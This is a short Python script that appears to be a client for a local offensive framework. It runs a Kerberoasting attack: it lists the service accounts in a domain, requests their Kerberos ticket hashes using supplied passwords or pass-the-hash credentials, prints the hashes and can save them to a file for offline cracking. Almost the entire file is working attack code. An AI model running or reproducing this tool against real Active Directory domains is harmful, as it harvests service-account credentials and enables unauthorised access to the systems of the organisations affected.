import requests as r
import argparse
from impacket.examples.utils import parse_credentials
import json

art = r.get('http://localhost:9000/').text
print('cool art:')
print(art)

parser = argparse.ArgumentParser()
parser.add_argument('target', action='store', help='domain[/username[:password]]')
parser.add_argument('-dc', help='dc ip', type=str,action="store")
parser.add_argument('-hash', help="pass the hash", type=str, default=":")
parser.add_argument('-no-preauth', action="store_true", help="does the user not require preauth, setting flag will make user NOT require it. set it to either 'True' if user does not have preauth")
parser.add_argument("-s", action="store_true", help="save the hashes to a file named tgs_hashes.txt")

options = parser.parse_args()

domain, username, password = parse_credentials(options.target)
h = options.hash
dc = options.dc
no_preauth = options.no_preauth
s = options.s

kerberoastable = r.get("http://localhost:9000/graphing/kerberoastable").json() # grab all users with spns
roastable = []
for kerb in kerberoastable:
    kerb = kerb['n'] # grab the memgraph data
    if domain == kerb['domain']:
        roastable.append(kerb['sAMAccountName'])

hs = []
for target in roastable:
    j = json.dumps({ # format the json data
  "target": {
    "domain": domain,
    "dc": dc,
    "user_name": username,
    "dc_ip": dc
  },
  "kerb": {
    "password": password,
    "user_hash": h,
    "get_hash": "True"
  },
  "roast": {
    "target_user": target,
    "no_preauth": str(no_preauth)
  }
})
    kerberoast = r.post("http://localhost:9000/kerberos/kerbroast", data=j).json()
    user = kerberoast['user']
    hash_ = kerberoast['kerb_data']
    print('--------------------')
    print("user           hash")
    print(f"{user}        {hash_}")
    hs.append(hash_)


if s == True:
  f = open('tgs_hashes.txt', 'w')
  for h in hs:
      h = h+ "\n"
      f.write(h)
